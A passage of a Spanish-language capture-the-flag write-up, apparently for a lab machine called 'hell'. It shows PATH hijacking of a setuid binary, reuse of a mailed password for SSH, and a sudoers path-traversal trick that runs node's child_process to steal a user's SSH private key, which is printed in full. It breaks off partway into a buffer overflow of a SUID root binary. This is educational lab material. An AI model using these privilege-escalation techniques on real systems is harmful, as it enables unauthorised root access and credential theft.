+<code><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ /opt/reports/reports 1
+
+Vulnerability: A Local File Inclusion has been detected in one of our web servers.  
+
+</span><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ /opt/reports/reports 2
+
+Vulnerability: SQL Injection has been detected in one of our servers.
+
+</span><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ /opt/reports/reports 3
+
+Attention: Please fix this as soon as possible.
+
+</span><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo al llegar al <code class="language-plaintext highlighter-rouge">4</code> dice que el archivo 4 no <code class="language-plaintext highlighter-rouge">existe</code> en el directorio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ /opt/reports/reports 4
+
+cat: /home/eddie/report/4: No such file or directory  
+
+</span><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para analizarlo lo descargamos con <code class="language-plaintext highlighter-rouge">scp</code> aprovechando la conexion ssh de pascual</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sshpass</span><span class="p"> -p vulnwhatsapp123! scp pascual@192.168.100.91:/opt/reports/reports .  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al decompilarlo con <code class="language-plaintext highlighter-rouge">ghidra</code> podemos ver el codigo de la función main en <code class="language-plaintext highlighter-rouge">C</code></p>
+<a href="/hmv/hell/12.png" target="_blank"><div><p><img src="/hmv/hell/12.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">int </span><span class="na">main</span><span class="p">(</span><span class="no">int </span><span class="am">param_1</span><span class="p">,undefined8 </span><span class="o">*</span><span class="am">param_2</span><span class="p">)
+
+{
+  </span><span class="no">char </span><span class="o">*</span><span class="p">__s;
+  </span><span class="no">int </span><span class="p">iVar1;
+  </span><span class="na">size_t </span><span class="p">sVar2;
+  </span><span class="no">long </span><span class="p">in_FS_OFFSET;
+  </span><span class="no">int </span><span class="p">local_94;
+  </span><span class="no">char </span><span class="p">local_88 [</span><span class="mi">104</span><span class="p">];
+  </span><span class="no">long </span><span class="p">local_20;
+
+  local_20 </span><span class="o">= *</span><span class="p">(</span><span class="no">long </span><span class="o">*</span><span class="p">)(in_FS_OFFSET </span><span class="o">+ </span><span class="mi">0x28</span><span class="p">);
+  </span><span class="o">if</span><span class="p"> (param_1 </span><span class="o">< </span><span class="mi">2</span><span class="p">) {
+    iVar1 </span><span class="o">= </span><span class="no">printf</span><span class="p">(</span><span class="s">"</span><span class="mi">\n\x1b</span><span class="s">[0;37m[</span><span class="mi">\x1b</span><span class="s">[0;31m-</span><span class="mi">\x1b</span><span class="s">[0;37m] Usage: </span><span class="mi">%s </span><span class="s">&ltid for report></span><span class="mi">\n\n</span><span class="p">",</span><span class="o">*</span><span class="p">param_2);
+  }
+  </span><span class="o">else</span><span class="p"> {
+    setreuid(</span><span class="mi">0x3ea</span><span class="p">,</span><span class="mi">0x3ea</span><span class="p">);
+    __s </span><span class="o">=</span><span class="p"> (</span><span class="no">char </span><span class="o">*</span><span class="p">)param_2[</span><span class="mi">1</span><span class="p">];
+    local_94 </span><span class="o">= </span><span class="mi">0</span><span class="p">;
+    </span><span class="o">while</span><span class="p">( </span><span class="mi">true</span><span class="p"> ) {
+      sVar2 </span><span class="o">= </span><span class="no">strlen</span><span class="p">(__s);
+      </span><span class="o">if</span><span class="p"> (sVar2 </span><span class="o"><=</span><span class="p"> (ulong)(</span><span class="no">long</span><span class="p">)local_94) </span><span class="o">break</span><span class="p">;
+      </span><span class="o">if </span><span class="p">(</span><span class="mi">9</span><span class="o"> < </span><span class="p">(</span><span class="no">int</span><span class="p">)__s[local_94] </span><span class="o">- </span><span class="mi">0x30</span><span class="no">U</span><span class="p">) {
+        </span><span class="no">printf</span><span class="p">(</span><span class="s">"</span><span class="mi">\n\x1b</span><span class="s">[0;37m[</span><span class="mi">\x1b</span><span class="s">[0;31m-</span><span class="mi">\x1b</span><span class="s">[0;37m] The input must be an identifier digit</span><span class="mi">\n\n</span><span class="s">"</span><span class="p">,__s);  
+        iVar1 </span><span class="o">= </span><span class="mi">1</span><span class="p">;
+        </span><span class="o">goto </span><span class="p">LAB_00101342;
+      }
+      local_94 </span><span class="o">= </span><span class="p">local_94 </span><span class="o">+ </span><span class="mi">1</span><span class="p">;
+    }
+    </span><span class="no">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);
+    </span><span class="no">sprintf</span><span class="p">(local_88,</span><span class="s">"cat /home/eddie/report/</span><span class="mi">%s</span><span class="s">"</span><span class="p">,__s);
+    </span><span class="no">system</span><span class="p">(local_88);
+    </span><span class="no">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);
+    iVar1 </span><span class="o">= </span><span class="mi">0</span><span class="p">;
+  }
+</span><span class="na">LAB_00101342</span><span class="p">:
+  </span><span class="o">if</span><span class="p"> (local_20 </span><span class="o">!= *</span><span class="p">(</span><span class="no">long </span><span class="o">*</span><span class="p">)(in_FS_OFFSET </span><span class="o">+ </span><span class="mi">0x28</span><span class="p">)) {
+                    </span><span class="c1">/* WARNING: Subroutine does not return */</span><span class="p">
+    __stack_chk_fail();
+  }
+  </span><span class="o">return </span><span class="p">iVar1;
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Analizando un poco el codigo decompilado inicia haciendo un <code class="language-plaintext highlighter-rouge">setresuid</code> pasandole como argumentos <code class="language-plaintext highlighter-rouge">0x3ea</code> que es igual a <code class="language-plaintext highlighter-rouge">1002</code> que pertenece a el usuario <code class="language-plaintext highlighter-rouge">eddie</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">setreuid(</span><span class="mi">0x3ea</span><span class="p">,</span><span class="mi">0x3ea</span><span class="p">);  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues recibe el argumento y almacena en <code class="language-plaintext highlighter-rouge">local_88</code> un comando que es <code class="language-plaintext highlighter-rouge">cat</code> a un directorio y el <code class="language-plaintext highlighter-rouge">id</code> como archivo, despues ejecuta local_88 con <code class="language-plaintext highlighter-rouge">system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">__s </span><span class="o">=</span><span class="p"> (</span><span class="no">char </span><span class="o">*</span><span class="p">)param_2[</span><span class="mi">1</span><span class="p">];
+</span><span class="no">sprintf</span><span class="p">(local_88,</span><span class="s">"cat /home/eddie/report/</span><span class="mi">%s</span><span class="s">"</span><span class="p">,__s);  
+</span><span class="no">system</span><span class="p">(local_88);</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La vulnerabilidad viene de usar el comando <code class="language-plaintext highlighter-rouge">cat</code> de forma relativa ya que se puede modificar el <code class="language-plaintext highlighter-rouge">path</code>, lo correcto seria usar la ruta <code class="language-plaintext highlighter-rouge">absoluta</code> al binario cat</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">✘ </span><span class="p">cat /home/eddie/report/%s
+</span><span class="ve">✔</span><span class="p"> /usr/bin/cat /home/eddie/report/%s  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para explotarlo podemos crear un archivo <code class="language-plaintext highlighter-rouge">cat</code> que contenga <code class="language-plaintext highlighter-rouge">bash</code>, damos permisos de ejecucion y modificamos el <code class="language-plaintext highlighter-rouge">path</code> para que tome el directorio actual primero</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ echo bash > cat
+</span><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ chmod +x cat
+</span><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ export PATH=$PWD:$PATH  
+</span><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el binario este ejecutara el comando <code class="language-plaintext highlighter-rouge">cat</code> y al ser nuestro cat prioritario ejecutara <code class="language-plaintext highlighter-rouge">bash</code> que es lo que contiene asi que nos da una bash como <code class="language-plaintext highlighter-rouge">eddie</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ /opt/reports/reports 1
+</span><span class="ve">eddie@hell</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ id
+uid=1002(eddie) gid=1004(pascual) groups=1004(pascual)  
+</span><span class="ve">eddie@hell</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ hostname -I
+192.168.100.91 172.17.0.1
+</span><span class="ve">eddie@hell</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora modificamos de nuevo el <code class="language-plaintext highlighter-rouge">path</code> para evitar conflictos al leer archivos y modificamos el <code class="language-plaintext highlighter-rouge">home</code> a el directorio home de <code class="language-plaintext highlighter-rouge">eddie</code>, podemos leer la <code class="language-plaintext highlighter-rouge">flag</code> 8</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">eddie@hell</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ export HOME=/home/eddie PATH=/bin:$PATH  
+</span><span class="ve">eddie@hell</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ cat ~/flag.txt
+
+█▀▀ █▀▄ █▀▄ █ █▀▀ █▀▄ █▀█ ▀█▀ ▄▀█
+██▄ █▄▀ █▄▀ █ ██▄ █▄▀ █▄█  █  █▀█
+
+Flag 8: HELL{R3L4T1V3_R0U735_4R3_FUN!}
+
+</span><span class="ve">eddie@hell</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag9">
+<br><h3 class="post-title">Flag 9</h3>
+<h4 class="post-title">HELL{B14CKH47_H4CK3R_F4C3B00K_WTF?}</h4><br>
+
+<p class="plain-text">El usuario eddie tambien tiene un <code class="language-plaintext highlighter-rouge">mail</code> esta vez de <code class="language-plaintext highlighter-rouge">ghost</code> que nos pide recuperar su cuenta hackeada, este nos proporciona la ultima <code class="language-plaintext highlighter-rouge">contraseña</code> que recuerda usar</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">eddie@hell</span><span class="p">:</span><span class="az">/var/mail</span><span class="p">$ ls
+eddie  pascual
+</span><span class="ve">eddie@hell</span><span class="p">:</span><span class="az">/var/mail</span><span class="p">$ cat eddie
+
+From: ghost@hall.h4u
+
+Hi eddie, can you see my hacked facebook account, I leave you the last password I remember: MySuperSecurePassword123!  
+
+</span><span class="ve">eddie@hell</span><span class="p">:</span><span class="az">/var/mail</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al probarla por <code class="language-plaintext highlighter-rouge">ssh</code> el usuario <code class="language-plaintext highlighter-rouge">ghost</code> reutiliza la contraseña para su cuenta a nivel de sistema, nos conectamos y podemos simplemente leer la novena <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">ghost@192.168.100.91
+ghost@192.168.100.91's password: MySuperSecurePassword123!  
+</span><span class="ve">ghost@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
+uid=1001(ghost) gid=1001(ghost) groups=1001(ghost)
+</span><span class="ve">ghost@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
+192.168.100.91 172.17.0.1
+</span><span class="ve">ghost@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat flag.txt
+
+█▀█ █▄▄ █▀▀ ▀▄▀ █▀▀ █ █ █▀█ █▀ ▀█▀
+█▄█ █▄█ █▀  █ █ █▄█ █▀█ █▄█ ▄█  █
+
+Flag 9: HELL{B14CKH47_H4CK3R_F4C3B00K_WTF?}
+
+</span><span class="ve">ghost@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag10">
+<br><h3 class="post-title">Flag 10</h3>
+<h4 class="post-title">HELL{7H3_5UD03R5_15_N07_4_60D_1D34}</h4><br>
+
+<p class="plain-text">Nos encontramos con un archivo <code class="language-plaintext highlighter-rouge">message.txt</code> de <code class="language-plaintext highlighter-rouge">gato</code> que nos dice que ha creado un script llmado <code class="language-plaintext highlighter-rouge">hex.js</code> en <code class="language-plaintext highlighter-rouge">node</code> que convierte una cadena normal en hexadecimal</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">ghost@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls
+flag.txt  message.txt
+</span><span class="ve">ghost@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat message.txt
+
+From: gatogamer1155@hell.h4u
+
+Hi ghost, just a heads up I created a script in node.js that converts text to hexadecimal, I'll leave it at my home directory for you to try, it's called hex.js :)  
+
+</span><span class="ve">ghost@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si miramos los privilegios de <code class="language-plaintext highlighter-rouge">sudoers</code> vemos que podemos ejecutar con <code class="language-plaintext highlighter-rouge">node</code> cualquier archivo despues de <code class="language-plaintext highlighter-rouge">/home/gato</code>, esto incluye claramente el script <code class="language-plaintext highlighter-rouge">hex.js</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">ghost@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo -l
+[sudo] password for ghost: MySuperSecurePassword123!
+Matching Defaults entries for ghost on hell:
+    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/bin\:/snap/bin  
+
+User ghost may run the following commands on hell:
+    (gato) /usr/bin/node /home/gato/*
+</span><span class="ve">ghost@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El script es muy sencillo, recibe una cadena como <code class="language-plaintext highlighter-rouge">input</code> y lo convierte en <code class="language-plaintext highlighter-rouge">hex</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">ghost@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo -u gato node /home/gato/hex.js  
+
+[</span><span class="az">*</span><span class="p">] Enter string: hola
+
+[</span><span class="ve">+</span><span class="p">] String hexadecimal: 686f6c61
+
+</span><span class="ve">ghost@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La vulnerabilidad esta en sudoers ya que podemos poner cualquier cosa despues de <code class="language-plaintext highlighter-rouge">/home/gato</code> incluido un path traversal para retroceder a la raiz <code class="language-plaintext highlighter-rouge">../../</code> asi que creamos un script en js que lea la id_rsa de <code class="language-plaintext highlighter-rouge">gato</code> y la deposite en /tmp como <code class="language-plaintext highlighter-rouge">key</code>, despues ejecutamos el js con sudo mediante el <code class="language-plaintext highlighter-rouge">path traversal</code> y nos crea el archivo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">ghost@hell</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ cat key.js
+require('child_process').exec('cat ~/.ssh/id_rsa > /tmp/key')
+</span><span class="ve">ghost@hell</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ sudo -u gato node /home/gato/../../tmp/key.js
+</span><span class="ve">ghost@hell</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ cat key
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACCw+d+VqCdToqmkfc8nt736B6Z96UkprX8Q45JvwEYyTAAAAJBWZgw+VmYM
+PgAAAAtzc2gtZWQyNTUxOQAAACCw+d+VqCdToqmkfc8nt736B6Z96UkprX8Q45JvwEYyTA
+AAAEDv2MMFeZn5fppNci2trFZ/08+0z2YqD0OU1zmYWmEUCbD535WoJ1OiqaR9zye3vfoH  
+pn3pSSmtfxDjkm/ARjJMAAAACWdhdG9AaGVsbAECAwQ=
+-----END OPENSSH PRIVATE KEY-----
+</span><span class="ve">ghost@hell</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos conectamos por ssh como <code class="language-plaintext highlighter-rouge">gato</code> utilizando la <code class="language-plaintext highlighter-rouge">id_rsa</code> y podemos leer la flag 10</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">gato@192.168.100.91 -i id_rsa
+</span><span class="ve">gato@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
+uid=1000(gato) gid=1000(gato) groups=1000(gato)
+</span><span class="ve">gato@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
+192.168.100.91 172.17.0.1
+</span><span class="ve">gato@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat flag.txt
+
+█▀▀ ▄▀█ ▀█▀ █▀█ █▀▀ ▄▀█ █▀▄▀█ █▀▀ █▀█ ▄█ ▄█ █▀ █▀
+█▄█ █▀█  █  █▄█ █▄█ █▀█ █ ▀ █ ██▄ █▀▄  █  █ ▄█ ▄█  
+
+Flag 10: HELL{7H3_5UD03R5_15_N07_4_60D_1D34}
+
+</span><span class="ve">gato@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag11">
+<br><h3 class="post-title">Flag 11</h3>
+<h4 class="post-title">HELL{0V3RF10W_F0R_B3G1NN3R5}</h4><br>
+
+<p class="plain-text">Si buscamos archivos com permisos suid nos encontramos que destaca <code class="language-plaintext highlighter-rouge">strlen</code>, el cual tiene como propietario al usuario <code class="language-plaintext highlighter-rouge">root</code> y privilegio <code class="language-plaintext highlighter-rouge">suid</code> para los usuarios</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">gato@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ find / -perm -4000 2>/dev/null  
+/opt/projects/strlen
+/usr/bin/fusermount3
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/umount
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/libexec/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+</span><span class="ve">gato@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l /opt/projects/strlen
+-rwsr-xr-x 1 root root 13064 Feb 15 22:04 </span><span class="err">/opt/projects/strlen</span><span class="p">
+</span><span class="ve">gato@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el binario nos pide una string como <code class="language-plaintext highlighter-rouge">argumento</code>, el programa es algo sencillo simplemente muestra la <code class="language-plaintext highlighter-rouge">longitud</code> de la <code class="language-plaintext highlighter-rouge">string</code> que le pasamos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">gato@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ /opt/projects/strlen
+
+█▀ ▀█▀ █▀█ █   █▀▀ █▄ █
+▄█  █  █▀▄ █▄▄ ██▄ █ ▀█
+
+[</span><span class="ro">-</span><span class="p">] Usage: /opt/projects/strlen &ltstring>
+
+</span><span class="ve">gato@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ /opt/projects/strlen hola  
+
+█▀ ▀█▀ █▀█ █   █▀▀ █▄ █
+▄█  █  █▀▄ █▄▄ ██▄ █ ▀█
+
+[</span><span class="az">*</span><span class="p">] String: hola
+
+[</span><span class="ve">+</span><span class="p">] Length: 4
+
+</span><span class="ve">gato@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para analizarlo a detalle podemos descargarlo con <code class="language-plaintext highlighter-rouge">scp</code> aprovechando la conexion</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ scp </span><span class="p">-i id_rsa gato@192.168.100.91:/opt/projects/strlen .  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al abrirlo con <code class="language-plaintext highlighter-rouge">ghidra</code> podemos ver todo el codigo decompilado en <code class="language-plaintext highlighter-rouge">C</code></p>
+<a href="/hmv/hell/13.png" target="_blank"><div><p><img src="/hmv/hell/13.png"></p></div></a>
+
+<p class="plain-text">Iniciemos con la función <code class="language-plaintext highlighter-rouge">main</code>, esta simplemente comprueba que se le pase un <code class="language-plaintext highlighter-rouge">argumento</code>, despues llama a la función <code class="language-plaintext highlighter-rouge">overflow</code> pasandole el argumento que recibe, ademas setea el <code class="language-plaintext highlighter-rouge">uid</code> a <code class="language-plaintext highlighter-rouge">0</code> que es el id que pertenece al usuario <code class="language-plaintext highlighter-rouge">root</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">void </span><span class="na">main</span><span class="p">(</span><span class="no">int </span><span class="am">param_1</span><span class="p">,undefined8 </span><span class="o">*</span><span class="am">param_2</span><span class="p">)
+
+{
+  </span><span class="no">puts</span><span class="p">(</span><span class="o">&</span><span class="p">DAT_00402008);
+  </span><span class="o">if</span><span class="p"> (param_1 </span><span class="o">< </span><span class="mi">2</span><span class="p">) {
+    </span><span class="no">printf</span><span class="p">(</span><span class="p">"</span><span class="mi">\n\x1b</span><span class="s">[0;37m[</span><span class="mi">\x1b</span><span class="s">[0;31m-</span><span class="mi">\x1b</span><span class="s">[0;37m] Usage: </span><span class="mi">%s </span><span class="s">&ltstring></span><span class="mi">\n\n</span><span class="s">",</span><span class="o">*</span><span class="p">param_2);  
+  }
+  </span><span class="o">else</span><span class="p"> {
+    setuid(</span><span class="mi">0</span><span class="p">);
+    overflow(param_2[</span><span class="mi">1</span><span class="p">]);
+  }
+  </span><span class="o">return</span><span class="p">;
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La vulnerabilidad se encuentra la función <code class="language-plaintext highlighter-rouge">overflow</code> ya que define un buffer de <code class="language-plaintext highlighter-rouge">256</code> bytes y usa la función <code class="language-plaintext highlighter-rouge">strcpy</code> con el parametro que es <code class="language-plaintext highlighter-rouge">vulnerable</code> a buffer overflow</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">void </span><span class="na">overflow</span><span class="p">(</span><span class="no">char </span><span class="o">*</span><span class="am">param_1</span><span class="p">)
+
+{
+  </span><span class="na">size_t </span><span class="p">sVar1;
+  </span><span class="no">char </span><span class="p">local_108 [</span><span class="mi">256</span><span class="p">];
+
+  </span><span class="no">printf</span><span class="p">(</span><span class="s">"</span><span class="mi">\n\x1b</span><span class="s">[0;37m[</span><span class="mi">\x1b</span><span class="s">[0;34m*</span><span class="mi">\x1b</span><span class="s">[0;37m] String: </span><span class="mi">%s\n</span><span class="s">"</span><span class="p">,param_1);
+  sVar1 </span><span class="o">= </span><span class="no">strlen</span><span class="p">(param_1);
+  </span><span class="no">printf</span><span class="p">(</span><span class="s">"</span><span class="mi">\n\x1b</span><span class="s">[0;37m[</span><span class="mi">\x1b</span><span class="s">[0;32m+</span><span class="mi">\x1b</span><span class="s">[0;37m] Length: </span><span class="mi">%lu\n\n</span><span class="s">"</span><span class="p">,sVar1);  
+  </span><span class="no">strcpy</span><span class="p">(local_108,param_1);
+  </span><span class="o">return</span><span class="p">;
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si miramos las protecciones del binario con <code class="language-plaintext highlighter-rouge">checksec</code> tiene todas deshabilitadas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">gato@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ checksec /opt/projects/strlen  
+[</span><span class="az">*</span><span class="p">] '/opt/projects/strlen'
+    Arch:     amd64-64-little
+    RELRO:    </span><span class="ro">No RELRO</span><span class="p">
+    Stack:    </span><span class="ro">No canary found</span><span class="p">
+    NX:       </span><span class="ro">NX disabled</span><span class="p">
+    PIE:      </span><span class="ro">No PIE (0x400000)</span><span class="p">
+    RWX:      </span><span class="ro">Has RWX segments</span><span class="p">
+</span><span class="ve">gato@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Será un buffer overflow basico, iniciemos creando un patron de <code class="language-plaintext highlighter-rouge">300</code> caracteres y correr el programa pasandoselo como <code class="language-plaintext highlighter-rouge">argumento</code>, como resultado este corrompe</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">gato@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ gdb -q /opt/projects/strlen
+Reading symbols from </span><span class="ve">/opt/projects/strlen</span><span class="p">...
+(No debugging symbols found in </span><span class="ve">/opt/projects/strlen</span><span class="p">)
+</span><span class="ro">gdb-peda$ </span><span class="p">pattern_arg 300
+Set 1 arguments to program
+</span><span class="ro">gdb-peda$ </span><span class="p">run
+Starting program: </span><span class="ve">/opt/projects/strlen</span><span class="p"> 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'  
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
+
+█▀ ▀█▀ █▀█ █   █▀▀ █▄ █
+▄█  █  █▀▄ █▄▄ ██▄ █ ▀█
+
+[</span><span class="az">*</span><span class="p">] String: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%
+
+[</span><span class="ve">+</span><span class="p">] Length: 300
+
+Program received signal SIGSEGV, Segmentation fault.
+</span><span class="az">
+[----------------------------------registers-----------------------------------]</span><span class="p">
+</span><span class="ve">RAX</span><span class="p">: </span><span class="az">0x7fffffffe190</span><span class="p"> ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
+</span><span class="ve">RBX</span><span class="p">: 0x0 
+</span><span class="ve">RCX</span><span class="p">: </span><span class="az">0x7fffffffe760</span><span class="p"> --> 0x25413625416725 ('%gA%6A%')
+</span><span class="ve">RDX</span><span class="p">: </span><span class="az">0x7fffffffe2b5</span><span class="p"> --> 0x25413625416725 ('%gA%6A%')
+</span><span class="ve">RSI</span><span class="p">: 0x5 
+</span><span class="ve">RDI</span><span class="p">: </span><span class="az">0x7fffffffe190</span><span class="p"> ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
+</span><span class="ve">RBP</span><span class="p">: 0x2541322541632541 ('A%cA%2A%')
+</span><span class="ve">RSP</span><span class="p">: </span><span class="az">0x7fffffffe298</span><span class="p"> ("HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
+</span><span class="ve">RIP</span><span class="p">: </span><span class="az">0x401297</span><span class="p"> (&ltoverflow+117>:	ret)
+</span><span class="ve">R8</span><span class="p"> : 0x0 
